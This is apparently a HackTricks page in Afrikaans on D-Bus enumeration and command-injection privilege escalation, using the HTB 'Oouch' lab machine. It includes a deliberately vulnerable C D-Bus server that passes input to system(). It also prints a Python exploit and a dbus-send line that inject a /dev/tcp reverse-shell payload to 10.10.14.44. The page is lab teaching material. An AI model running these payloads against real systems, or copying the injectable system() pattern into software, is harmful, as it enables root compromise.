# D-Bus Enumerasie & Opdrag Inspuiting Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## **GUI enumerasie**

D-Bus word gebruik as die inter-proses kommunikasie (IPC) mediator in Ubuntu desktop omgewings. Op Ubuntu word die gelyktydige werking van verskeie boodskapbusse waargeneem: die stelselsbus, wat hoofsaaklik deur **bevoegde dienste gebruik word om dienste wat oor die stelsel relevant is, bloot te stel**, en 'n sessiebus vir elke ingelogde gebruiker, wat dienste blootstel wat slegs relevant is vir daardie spesifieke gebruiker. Die fokus hier is hoofsaaklik op die stelselsbus weens die verband met dienste wat op hoër bevoegdhede (bv. root) loop, aangesien ons doel is om bevoegdhede te verhoog. Dit word opgemerk dat D-Bus se argitektuur 'n 'router' per sessiebus gebruik, wat verantwoordelik is vir die herlei van kliëntboodskappe na die toepaslike dienste gebaseer op die adres wat deur die kliënte vir die diens wat hulle wil kommunikeer, gespesifiseer is.

Dienste op D-Bus word gedefinieer deur die **objekte** en **interfaces** wat hulle blootstel. Objekte kan vergelyk word met klasinstansies in standaard OOP tale, met elke instansie uniek geïdentifiseer deur 'n **objekpad**. Hierdie pad, soortgelyk aan 'n lêerstelsel pad, identifiseer elke objek wat deur die diens blootgestel word. 'n Sleutelinterface vir navorsingsdoeleindes is die **org.freedesktop.DBus.Introspectable** interface, wat 'n enkele metode, Introspect, bevat. Hierdie metode keer 'n XML voorstelling van die objek se ondersteunende metodes, seine, en eienskappe terug, met 'n fokus hier op metodes terwyl eienskappe en seine weggelaat word.

Vir kommunikasie met die D-Bus interface, is twee gereedskap gebruik: 'n CLI-gereedskap genaamd **gdbus** vir maklike aanroep van metodes wat deur D-Bus in skripte blootgestel word, en [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), 'n Python-gebaseerde GUI-gereedskap wat ontwerp is om die dienste wat op elke bus beskikbaar is, te enumerate en om die objekte wat binne elke diens bevat is, te vertoon.
```bash
sudo apt-get install d-feet
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

In die eerste beeld word dienste wat geregistreer is met die D-Bus stelselsbus getoon, met **org.debin.apt** spesifiek uitgelig na die keuse van die Stelselsbus-knoppie. D-Feet vra hierdie diens vir voorwerpe, wat interfaces, metodes, eienskappe en seine vir gekose voorwerpe vertoon, soos gesien in die tweede beeld. Elke metode se handtekening is ook gedetailleerd.

'n Opmerklike kenmerk is die vertoning van die diens se **proses ID (pid)** en **opdraglyn**, nuttig om te bevestig of die diens met verhoogde voorregte loop, belangrik vir navorsingsrelevansie.

**D-Feet laat ook metode-aanroep toe**: gebruikers kan Python-uitdrukkings as parameters invoer, wat D-Feet na D-Bus tipes omskakel voordat dit aan die diens oorgedra word.

Let egter daarop dat **sommige metodes verifikasie vereis** voordat ons hulle kan aanroep. Ons sal hierdie metodes ignoreer, aangesien ons doel is om ons voorregte te verhoog sonder om eers akrediteer te wees.

Let ook daarop dat sommige van die dienste 'n ander D-Bus diens genaamd org.freedeskto.PolicyKit1 vra of 'n gebruiker toegelaat moet word om sekere aksies uit te voer of nie.

## **Cmd lyn Enumerasie**

### Lys Diens Voorwerpe

Dit is moontlik om geopende D-Bus interfaces te lys met:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
#### Verbindinge

[Van wikipedia:](https://en.wikipedia.org/wiki/D-Bus) Wanneer 'n proses 'n verbinding met 'n bus opstel, ken die bus 'n spesiale busnaam aan die verbinding toe wat _unieke verbindingsnaam_ genoem word. Busname van hierdie tipe is onveranderlik—dit is gewaarborg dat hulle nie sal verander solank die verbinding bestaan nie—en, nog belangriker, hulle kan nie hergebruik word gedurende die bus se lewensduur nie. Dit beteken dat geen ander verbinding met daardie bus ooit so 'n unieke verbindingsnaam toegeken sal word nie, selfs al sluit dieselfde proses die verbinding met die bus en skep 'n nuwe een. Unieke verbindingsname is maklik herkenbaar omdat hulle begin met die—andersins verbode—dubbelepuntkarakter.

### Diensobjek Inligting

Dan kan jy 'n paar inligting oor die koppelvlak verkry met:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
### Lys Interfaces van 'n Diensobjek

Jy moet genoeg regte hê.
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### Introspect Interface of a Service Object

Let op hoe in hierdie voorbeeld die nuutste interface gekies is wat ontdek is met die `tree` parameter (_sien vorige afdeling_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
Let op die metode `.Block` van die interface `htb.oouch.Block` (die een waarin ons belangstel). Die "s" van die ander kolomme kan beteken dat dit 'n string verwag.

### Monitor/Vang Interface

Met genoeg voorregte (net `send_destination` en `receive_sender` voorregte is nie genoeg nie) kan jy **'n D-Bus kommunikasie monitor**.

Om te **monitor** 'n **kommunikasie** moet jy **root** wees. As jy steeds probleme ondervind om root te wees, kyk [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) en [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

> [!WARNING]
> As jy weet hoe om 'n D-Bus konfigurasie lêer te konfigureer om **nie-root gebruikers toe te laat om** die kommunikasie te snuffel, kontak asseblief **my**!

Verskillende maniere om te monitor:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
In die volgende voorbeeld word die koppelvlak `htb.oouch.Block` gemonitor en **die boodskap "**_**lalalalal**_**" word deur miskommunikasie gestuur**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
U kan `capture` gebruik in plaas van `monitor` om die resultate in 'n pcap-lêer te stoor.

#### Filtrering van al die geraas <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

As daar net te veel inligting op die bus is, gebruik 'n ooreenkomsreël soos volg:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
Meerdere reëls kan gespesifiseer word. As 'n boodskap _enige_ van die reëls ooreenstem, sal die boodskap gedruk word. So:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
Sien die [D-Bus dokumentasie](http://dbus.freedesktop.org/doc/dbus-specification.html) vir meer inligting oor die sintaksis van wedstrydreëls.

### Meer

`busctl` het selfs meer opsies, [**vind al hulle hier**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Kwetsbare Scenario**

As gebruiker **qtc binne die gasheer "oouch" van HTB** kan jy 'n **onverwagte D-Bus konfigurasie lêer** vind geleë in _/etc/dbus-1/system.d/htb.oouch.Block.conf_:
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
Nota van die vorige konfigurasie dat **jy die gebruiker `root` of `www-data` moet wees om inligting te stuur en te ontvang** via hierdie D-BUS kommunikasie.

As gebruiker **qtc** binne die docker houer **aeb4525789d8** kan jy 'n paar dbus verwante kode in die lêer _/code/oouch/routes.py._ vind. Dit is die interessante kode:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
Soos wat jy kan sien, is dit **verbinde met 'n D-Bus-koppelvlak** en stuur na die **"Block" funksie** die "client_ip".

Aan die ander kant van die D-Bus-verbinding is daar 'n C-gecompileerde binêre wat loop. Hierdie kode **luister** in die D-Bus-verbinding **vir IP-adresse en roep iptables aan via die `system` funksie** om die gegewe IP-adres te blokkeer.\
**Die oproep na `system` is doelbewus kwesbaar vir opdraginjekie**, so 'n payload soos die volgende sal 'n omgekeerde shell skep: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Exploit dit

Aan die einde van hierdie bladsy kan jy die **volledige C-kode van die D-Bus-toepassing** vind. Binne-in dit kan jy tussen die lyne 91-97 **hoe die `D-Bus objek pad`** **en `koppelvlak naam`** ** geregistreer** word. Hierdie inligting sal nodig wees om inligting na die D-Bus-verbinding te stuur:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
Ook, in lyn 57 kan jy vind dat **die enigste metode geregistreer** vir hierdie D-Bus kommunikasie `Block` genoem word (_**Daarom gaan die payloads in die volgende afdeling na die diensobjek `htb.oouch.Block`, die koppelvlak `/htb/oouch/Block` en die metodenaam `Block` gestuur word**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

Die volgende python kode sal die payload na die D-Bus verbinding stuur na die `Block` metode via `block_iface.Block(runme)` (_let op dat dit uit die vorige stuk kode onttrek is_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl en dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
- `dbus-send` is 'n hulpmiddel wat gebruik word om boodskappe na “Message Bus” te stuur.
- Message Bus – 'n sagteware wat deur stelsels gebruik word om kommunikasie tussen toepassings maklik te maak. Dit is verwant aan Message Queue (boodskappe is in volgorde) maar in Message Bus word die boodskappe in 'n subskripsiemodel gestuur en ook baie vinnig.
- “-system” etiket word gebruik om te noem dat dit 'n stelselsboodskap is, nie 'n sessieboodskap nie (per standaard).
- “–print-reply” etiket word gebruik om ons boodskap toepaslik te druk en enige antwoorde in 'n menslike leesbare formaat te ontvang.
- “–dest=Dbus-Interface-Block” Die adres van die Dbus-koppelvlak.
- “–string:” – Tipe boodskap wat ons wil stuur na die koppelvlak. Daar is verskeie formate om boodskappe te stuur soos dubbel, bytes, booleans, int, objpath. Van hierdie, is die “object path” nuttig wanneer ons 'n pad van 'n lêer na die Dbus-koppelvlak wil stuur. Ons kan 'n spesiale lêer (FIFO) in hierdie geval gebruik om 'n opdrag na die koppelvlak te stuur in die naam van 'n lêer. “string:;” – Dit is om die objekpad weer aan te roep waar ons die FIFO omgekeerde skulp lêer/opdrag plaas.

_Note dat in `htb.oouch.Block.Block`, die eerste deel (`htb.oouch.Block`) verwys na die diensobjek en die laaste deel (`.Block`) verwys na die metode naam._ 

### C code
```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
## Verwysings

- [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)

{{#include ../../banners/hacktricks-training.md}}
